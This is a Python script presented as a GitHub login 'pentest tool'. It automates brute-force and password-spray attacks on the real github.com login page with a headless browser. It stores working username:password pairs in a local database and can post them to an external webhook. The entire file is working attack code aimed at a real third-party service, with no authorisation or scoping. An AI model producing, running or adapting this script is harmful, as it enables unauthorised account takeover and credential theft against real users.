#!/usr/bin/env python3
"""
GitHubBruteForceCore - Production GitHub login pentest tool
"""

import asyncio
import sqlite3
import aiohttp
import hashlib
from datetime import datetime
from pathlib import Path
from playwright.async_api import async_playwright
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

class GitHubBruteForceCore:
    def __init__(self, targets_file: str, wordlist_file: str, mode: str = 'bruteforce', 
                 threads: int = 5, delay: float = 2.0, webhook: str = None):
        self.targets_file = Path(targets_file)
        self.wordlist_file = Path(wordlist_file)
        self.mode = mode
        self.threads = min(threads, 10)  # Cap threads
        self.delay = delay
        self.webhook = webhook
        self.targets = []
        self.wordlist = []
        self.results_db = Path("github_results.db")
        
        self.init_db()
        self.load_lists()
    
    def init_db(self):
        conn = sqlite3.connect(self.results_db)
        conn.execute("CREATE TABLE IF NOT EXISTS hits (target TEXT, password TEXT, time TEXT)")
        conn.commit()
        conn.close()
    
    def load_lists(self):
        with open(self.targets_file) as f:
            self.targets = [line.strip() for line in f if line.strip()]
        with open(self.wordlist_file) as f:
            self.wordlist = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(self.targets)} targets, {len(self.wordlist)} passwords")
    
    async def test_login(self, page, username: str, password: str):
        """Clean single login test"""
        try:
            await page.goto('https://github.com/login', wait_until='networkidle')
            await page.fill('input[name="login"]', username)
            await page.fill('input[name="password"]', password)
            await page.click('input[type="submit"]')
            await page.wait_for_timeout(2000)
            
            content = await page.content()
            is_success = 'flash-success' in content or 'octicon-check' in content
            is_fail = 'flash-error' in content or 'incorrect' in content.lower()
            
            if is_success:
                logger.critical(f"🎯 HIT FOUND: {username}:{password}")
                self.save_hit(username, password)
                if self.webhook:
                    await self.notify_webhook(username, password)
                return True
            
            await page.wait_for_timeout(int(self.delay * 1000))
            return False
            
        except Exception as e:
            logger.debug(f"Login test error: {e}")
            return False
    
    def save_hit(self, username, password):
        conn = sqlite3.connect(self.results_db)
        conn.execute("INSERT INTO hits (target, password, time) VALUES (?, ?, ?)",
                    (username, password, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    async def notify_webhook(self, username, password):
        async with aiohttp.ClientSession() as session:
            await session.post(self.webhook, json={
                "content": f"🟢 **GITHUB HIT** 🟢\n`{username}:{password}`"
            })
    
    async def spray_mode(self):
        """Password spray: 1 password → all targets"""
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()
            
            semaphore = asyncio.Semaphore(self.threads)
            
            async def test_password(password):
                async with semaphore:
                    for target in self.targets:
                        if await self.test_login(page, target, password):
                            return True
                    return False
            
            tasks = [test_password(pw) for pw in self.wordlist]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            await browser.close()
    
    async def brute_mode(self):
        """Brute force: all passwords → 1 target"""
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()
            
            semaphore = asyncio.Semaphore(self.threads)
            
            async def test_target(target):
                async with semaphore:
                    for password in self.wordlist:
                        if await self.test_login(page, target, password):
                            return True
                    return False
            
            tasks = [test_target(target) for target in self.targets]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            await browser.close()
    
    async def run(self):
        logger.info(f"🚀 Starting {self.mode} attack ({self.threads} threads)")
        if self.mode == 'spray':
            await self.spray_mode()
        else:
            await self.brute_mode()
        logger.info("✅ Attack complete! Check github_results.db")